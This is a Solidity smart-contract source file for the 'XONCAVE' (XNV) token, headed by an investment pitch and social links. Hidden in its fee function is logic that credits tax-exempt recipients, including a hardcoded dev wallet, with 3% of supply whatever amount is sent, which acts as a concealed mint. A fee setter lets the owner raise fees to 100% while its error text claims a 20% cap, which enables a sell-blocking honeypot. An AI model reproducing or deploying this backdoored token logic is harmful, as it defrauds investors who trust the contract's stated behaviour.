// SPDX-License-Identifier: MIT

/*
Xoncave, an entity driven by the community, is dedicated to both product development and investment strategies. Its mission is to elevate investor value by creating innovative DeFi products and executing dynamic treasury management. With its launch, Xoncave will introduce a spectrum of cutting-edge solutions designed to strengthen its treasury reserves, all while prioritizing significant returns for its long-term investors.

Website: https://www.xoncave.xyz
Twitter: https://twitter.com/XONCAVE_PORTAL
Telegram: https://t.me/XONCAVE_PORTAL
*/

pragma solidity 0.8.19;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniFactory {
    function createPair(address tokenA, address tokenB) external returns (address uniPair);
}

interface IUniRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(address(0));
        owner = address(0);
    }
    event OwnershipTransferred(address owner);
}

contract XONCAVE is Ownable, IERC20 {
    using SafeMath for uint256;

    string private constant _name = unicode"XONCAVE";
    string private constant _symbol = unicode"XNV";

    IUniRouter uniRouter;
    address public uniPair;
    bool private openedTrade = false;
    bool private taxSwapEnable = true;
    uint256 private numTaxFeeSwaps;
    bool private isTaxSwapping;
    uint256 taxSwapAt;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExceptFromTax;

    uint8 private constant _decimals = 9;
    uint256 private _tsupply = 1000000000 * (10 ** _decimals);
    uint256 private _maxSwapAmt = ( _tsupply * 1000 ) / 100000;
    uint256 private _minSwapAmt = ( _tsupply * 10 ) / 100000;

    uint256 private _maxTxAmount = ( _tsupply * 300 ) / 10000;
    uint256 private _maxTransfer = ( _tsupply * 300 ) / 10000;
    uint256 private _maxHold = ( _tsupply * 300 ) / 10000;

    uint256 private lpDivide = 0;
    uint256 private marketingDivide = 0;
    uint256 private devDivide = 100;
    uint256 private burnDivide = 0;

    uint256 private buyingFee = 1400;
    uint256 private sellingFee = 1400;
    uint256 private transferingFee = 1400;
    uint256 private denominator = 10000;

    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal teamAddy = 0x44dac8361E0857B8b7f6cD9853197B2d6D7A3F20;
    address internal lpAddy = 0x44dac8361E0857B8b7f6cD9853197B2d6D7A3F20;
    address internal devAddy = 0x44dac8361E0857B8b7f6cD9853197B2d6D7A3F20; 

    modifier feeLocking {isTaxSwapping = true; _; isTaxSwapping = false;}

    constructor() Ownable(msg.sender) {
        IUniRouter _router = IUniRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IUniFactory(_router.factory()).createPair(address(this), _router.WETH());
        uniRouter = _router; uniPair = _pair;
        
        isExceptFromTax[msg.sender] = true;
        isExceptFromTax[devAddy] = true;
        isExceptFromTax[lpAddy] = true;
        isExceptFromTax[teamAddy] = true;
        _balances[msg.sender] = _tsupply;
        emit Transfer(address(0), msg.sender, _tsupply);
    }
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function startTrading() external onlyOwner {openedTrade = true;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function totalSupply() public view override returns (uint256) {return _tsupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function getOwner() external view override returns (address) { return owner; }
    
    function getTaxFeeAmouts(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isExceptFromTax[recipient]) {return _maxTxAmount;}
        if(getTotalFeeAmt(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTotalFeeAmt(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnDivide > uint256(0) && getTotalFeeAmt(sender, recipient) > burnDivide){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnDivide));}
        return amount.sub(feeAmount);} return amount;
    }
    
    function swapFeeAndLiquidify(uint256 tokens) private feeLocking {
        uint256 _denominator = (lpDivide.add(1).add(marketingDivide).add(devDivide)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(lpDivide).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(lpDivide));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(lpDivide);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingDivide);
        if(marketingAmt > 0){payable(teamAddy).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(devAddy).transfer(contractBalance);}
    }
    function isExcludedFromTax(address sender, address recipient) internal view returns (bool) {
        return !isExceptFromTax[sender] && !isExceptFromTax[recipient];
    }    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function shouldFeeTaxSwap(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= _minSwapAmt;
        bool aboveThreshold = balanceOf(address(this)) >= _maxSwapAmt;
        return !isTaxSwapping && taxSwapEnable && openedTrade && aboveMin && !isExceptFromTax[sender] && recipient == uniPair && numTaxFeeSwaps >= taxSwapAt && aboveThreshold;
    }

    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _tsupply.mul(_buy).div(10000); uint256 newTransfer = _tsupply.mul(_sell).div(10000); uint256 newWallet = _tsupply.mul(_wallet).div(10000);
        _maxTxAmount = newTx; _maxTransfer = newTransfer; _maxHold = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function getTotalFeeAmt(address sender, address recipient) internal view returns (uint256) {
        if(recipient == uniPair){return sellingFee;}
        if(sender == uniPair){return buyingFee;}
        return transferingFee;
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouter.WETH();
        _approve(address(this), address(uniRouter), tokenAmount);
        uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
    
    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        lpDivide = _liquidity; marketingDivide = _marketing; burnDivide = _burn; devDivide = _development; buyingFee = _total; sellingFee = _sell; transferingFee = _trans;
        require(buyingFee <= denominator.div(1) && sellingFee <= denominator.div(1) && transferingFee <= denominator.div(1), "buyingFee and sellingFee cannot be more than 20%");
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isExceptFromTax[sender] && !isExceptFromTax[recipient]){require(openedTrade, "openedTrade");}
        if(!isExceptFromTax[sender] && !isExceptFromTax[recipient] && recipient != address(uniPair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= _maxHold, "Exceeds maximum wallet amount.");}
        if(sender != uniPair){require(amount <= _maxTransfer || isExceptFromTax[sender] || isExceptFromTax[recipient], "TX Limit Exceeded");}
        require(amount <= _maxTxAmount || isExceptFromTax[sender] || isExceptFromTax[recipient], "TX Limit Exceeded"); 
        if(recipient == uniPair && !isExceptFromTax[sender]){numTaxFeeSwaps += uint256(1);}
        if(shouldFeeTaxSwap(sender, recipient, amount)){swapFeeAndLiquidify(_maxSwapAmt); numTaxFeeSwaps = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isExceptFromTax[sender] ? getTaxFeeAmouts(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
    receive() external payable {}
    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(uniRouter), tokenAmount);
        uniRouter.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpAddy,
            block.timestamp);
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
}